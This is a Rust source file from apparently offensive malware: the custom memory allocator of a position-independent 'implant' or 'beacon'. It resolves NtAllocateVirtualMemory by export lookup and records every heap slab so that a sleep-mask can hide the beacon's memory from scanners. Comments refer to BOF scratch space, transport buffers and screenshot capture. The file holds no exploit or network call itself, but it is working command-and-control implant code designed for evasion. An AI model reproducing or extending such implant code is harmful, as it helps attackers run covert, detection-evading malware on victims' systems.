//! Bump allocator for the PIC implant, backed by NtAllocateVirtualMemory.
//!
//! A bump allocator over VirtualAlloc'd regions is the classic PIC-implant
//! choice (Stardust, Rustic64): one API to resolve, no free-list, no heap
//! handle, no loader-lock deadlock risk from RtlAllocateHeap.
//!
//! cfg(target_os = "windows") -- only compiles on Windows.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
static ALLOC_LOCK: AtomicBool = AtomicBool::new(false);

unsafe fn lock_allocator() {
    while ALLOC_LOCK.compare_exchange_weak(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {
        core::hint::spin_loop();
    }
}

unsafe fn unlock_allocator() {
    ALLOC_LOCK.store(false, Ordering::Release);
}

const SLAB_SIZE: usize = 1 << 20;
const ALIGN: usize = 16;
/// Maximum number of slabs the allocator can track (for heap enumeration at
/// sleep-mask time). 16 slabs × 1 MiB default = 16 MiB, well above a typical
/// beacon's footprint (config + transport buffers + BOF scratch).
pub(crate) const MAX_SLABS: usize = 16;

static NT_ALLOC: AtomicU64 = AtomicU64::new(0);
static RESOLVED: AtomicBool = AtomicBool::new(false);
static SLAB_BASE: AtomicU64 = AtomicU64::new(0);
static SLAB_BUMP: AtomicU64 = AtomicU64::new(0);

/// Descriptor for an allocated slab — base address + committed size.
/// Tracked so `enumerate_slabs()` can hand the sleep-mask a complete list of
/// heap regions without maintaining a separate free-list.
#[derive(Clone, Copy)]
struct SlabDesc {
    base: u64,
    len: u64,
}

/// All slabs ever allocated (bump-only, never reclaimed).
static mut SLAB_TABLE: [SlabDesc; MAX_SLABS] = [SlabDesc { base: 0, len: 0 }; MAX_SLABS];
static mut SLAB_COUNT: usize = 0;

/// Record a newly allocated slab in the tracking table.
/// Called from `new_slab_min` after a successful NtAllocateVirtualMemory.
/// The caller MUST hold `ALLOC_LOCK`.
unsafe fn track_slab(base: *mut u8, committed: usize) {
    let idx = SLAB_COUNT;
    if idx < MAX_SLABS {
        SLAB_TABLE[idx] = SlabDesc {
            base: base as u64,
            len: committed as u64,
        };
        SLAB_COUNT = idx + 1;
    } else {
        // Slab table full — shift entries left (drop oldest), insert at end.
        // This keeps tracking alive instead of silently losing slab info.
        crate::entry::diag_mark(b"ERR_SLAB_OVERFLOW_SHIFT");
        for i in 1..MAX_SLABS {
            SLAB_TABLE[i - 1] = SLAB_TABLE[i];
        }
        SLAB_TABLE[MAX_SLABS - 1] = SlabDesc {
            base: base as u64,
            len: committed as u64,
        };
    }
}

/// Iterator over all allocated slabs. Used by `mem::enumerate_beacon_heap_regions`
/// to mask every heap page at sleep. Each entry is `(base_ptr, byte_len)`.
pub fn enumerate_slabs() -> impl Iterator<Item = (*mut u8, usize)> {
    unsafe {
        lock_allocator();
        let count = SLAB_COUNT;
        let table = SLAB_TABLE;
        unlock_allocator();
        (0..count).filter_map(move |i| {
            let d = table[i];
            if d.base != 0 && d.len != 0 {
                Some((d.base as *mut u8, d.len as usize))
            } else {
                None
            }
        })
    }
}

/// Total bytes across all tracked slabs (for diagnostics).
pub fn heap_bytes() -> usize {
    unsafe {
        lock_allocator();
        let count = SLAB_COUNT;
        let table = SLAB_TABLE;
        unlock_allocator();
        (0..count).map(|i| table[i].len as usize).sum()
    }
}

type NtAllocVirtualMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *mut *mut core::ffi::c_void,
    usize, // ZeroBits — BY VALUE (ULONG_PTR), not a pointer. Passing &mut here
    // put a stack address in the ZeroBits argument register; the kernel
    // validates ZeroBits ≤ 21 for user mode and rejected the allocation.
    *mut usize,
    u32,
    u32,
) -> i32;

unsafe fn ensure_resolved() {
    if RESOLVED.load(Ordering::Acquire) {
        return;
    }
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
        NT_ALLOC.store(addr as u64, Ordering::Release);
    }
    RESOLVED.store(true, Ordering::Release);
}

/// Allocate a fresh slab of at least `min_size` bytes (rounded up to
/// SLAB_SIZE). A request larger than SLAB_SIZE gets its own oversized slab so
/// the bump cursor never points past the committed region — the bug this fixes
/// was: an 8 MiB screenshot buffer requested a new 1 MiB slab, set the bump
/// cursor to 8 MiB, and handed back the slab base; the 8 MiB write then ran
/// off the end of the 1 MiB commit → segfault.
unsafe fn new_slab_min(min_size: usize) -> *mut u8 {
    let f: NtAllocVirtualMemory = match NT_ALLOC.load(Ordering::Acquire) {
        0 => return core::ptr::null_mut(),
        a => core::mem::transmute(a as usize),
    };
    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    // Round up to a whole number of SLAB_SIZE pages, but never below SLAB_SIZE.
    let mut size: usize = SLAB_SIZE;
    if min_size > SLAB_SIZE {
        let pages = (min_size + SLAB_SIZE - 1) / SLAB_SIZE;
        size = pages * SLAB_SIZE;
    }
    // NtCurrentProcess() == (HANDLE)-1
    let cur_proc: *mut core::ffi::c_void = (-1isize) as *mut core::ffi::c_void;
    let status = f(cur_proc, &mut base, 0, &mut size, 0x3000, 0x04);
    if status < 0 || base.is_null() {
        return core::ptr::null_mut();
    }
    // Track the slab for heap enumeration at sleep-mask time.
    track_slab(base as *mut u8, size);
    base as *mut u8
}

/// The committed size of the slab currently in use. Tracked so the overflow
/// check compares against the REAL slab size, not the default 1 MiB (an
/// oversized slab holding a large allocation must allow further bumps within
/// its remaining space).
static SLAB_COMMITTED: AtomicU64 = AtomicU64::new(0);

/// Static fallback buffer used before NtAllocateVirtualMemory is resolved
/// (during Rust runtime static-init at dll load). 64 KiB is plenty for the
/// handful of tiny allocations the runtime makes before control reaches our
/// entry. Once the entry runs and resolve succeeds, real slabs take over.
static FALLBACK_BUF: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
const FALLBACK_SIZE: usize = 1 << 16;
static mut FALLBACK_MEM: [u8; FALLBACK_SIZE] = [0; FALLBACK_SIZE];

/// Force the allocator to resolve NtAllocateVirtualMemory NOW (call from entry
/// before any alloc-heavy code). Public so the entry can prime it.
pub unsafe fn force_resolve() {
    ensure_resolved();
}

/// The resolved NtAllocateVirtualMemory address (0 = not yet resolved).
pub fn nt_alloc_addr() -> u64 {
    NT_ALLOC.load(Ordering::Acquire)
}

pub struct NtHeapAllocator;

unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
    unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
        let size = layout.size();
        if size == 0 {
            return core::ptr::null_mut();
        }
        let aligned = (size + ALIGN - 1) & !(ALIGN - 1);

        ensure_resolved();
        if NT_ALLOC.load(Ordering::Acquire) != 0 {
            unsafe { lock_allocator(); }
            // Real allocator path.
            loop {
                // If no slab yet, allocate one first. For a request larger than
                // the default slab, ask for an oversized slab up front.
                if SLAB_BASE.load(Ordering::Acquire) == 0 {
                    let nb = new_slab_min(aligned);
                    if nb.is_null() {
                        break;
                    }
                    let committed = if aligned > SLAB_SIZE {
                        // Oversized slab: its committed size is the rounded-up
                        // multiple of SLAB_SIZE that new_slab_min chose. Recompute
                        // it the same way so SLAB_COMMITTED matches.
                        let pages = (aligned + SLAB_SIZE - 1) / SLAB_SIZE;
                        (pages * SLAB_SIZE) as u64
                    } else {
                        SLAB_SIZE as u64
                    };
                    SLAB_BASE.store(nb as u64, Ordering::Release);
                    SLAB_COMMITTED.store(committed, Ordering::Release);
                    SLAB_BUMP.store(0, Ordering::Release);
                }
                let base = SLAB_BASE.load(Ordering::Acquire);
                let committed = SLAB_COMMITTED.load(Ordering::Acquire);
                let off = SLAB_BUMP.load(Ordering::Acquire);
                let new_off = off + aligned as u64;
                if new_off <= committed {
                    if SLAB_BUMP
                        .compare_exchange(off, new_off, Ordering::AcqRel, Ordering::Acquire)
                        .is_ok()
                    {
                        unsafe { unlock_allocator(); }
                        return (base as usize + off as usize) as *mut u8;
                    }
                    continue;
                }
                // Current slab can't fit this allocation: allocate a fresh slab
                // big enough to hold it. (The OLD bug: always allocated a default
                // 1 MiB slab even for an 8 MiB request, then set the bump cursor
                // past the commit → out-of-bounds write → segfault.)
                let nb = new_slab_min(aligned);
                if nb.is_null() {
                    break;
                }
                let committed = if aligned > SLAB_SIZE {
                    let pages = (aligned + SLAB_SIZE - 1) / SLAB_SIZE;
                    (pages * SLAB_SIZE) as u64
                } else {
                    SLAB_SIZE as u64
                };
                SLAB_BASE.store(nb as u64, Ordering::Release);
                SLAB_COMMITTED.store(committed, Ordering::Release);
                SLAB_BUMP.store(aligned as u64, Ordering::Release);
                unsafe { unlock_allocator(); }
                return nb;
            }
            unsafe { unlock_allocator(); }
        }

        // Fallback: bump within the static buffer.
        // Uses CAS loop to prevent two threads from receiving the same region
        // if the fallback path is entered concurrently.
        loop {
            let cur = FALLBACK_BUF.load(Ordering::Acquire);
            let nxt = cur + aligned as u64;
            if nxt > FALLBACK_SIZE as u64 {
                return core::ptr::null_mut();
            }
            if FALLBACK_BUF
                .compare_exchange_weak(cur, nxt, Ordering::AcqRel, Ordering::Relaxed)
                .is_ok()
            {
                let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
                return base.add(cur as usize);
            }
        }
    }
    unsafe fn dealloc(&self, _ptr: *mut u8, _layout: core::alloc::Layout) {}
}
